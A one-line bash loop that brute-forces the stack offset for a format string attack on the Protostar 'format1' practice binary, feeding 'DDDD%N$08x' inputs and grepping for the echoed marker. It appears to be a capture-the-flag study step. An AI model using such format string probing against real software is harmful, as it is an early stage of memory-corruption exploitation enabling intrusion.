for i in {1..200};do echo "trying offset $i - `/opt/protostar/bin/format1 DDDD%$i\\$08x`"; done | grep DDDD44444444  
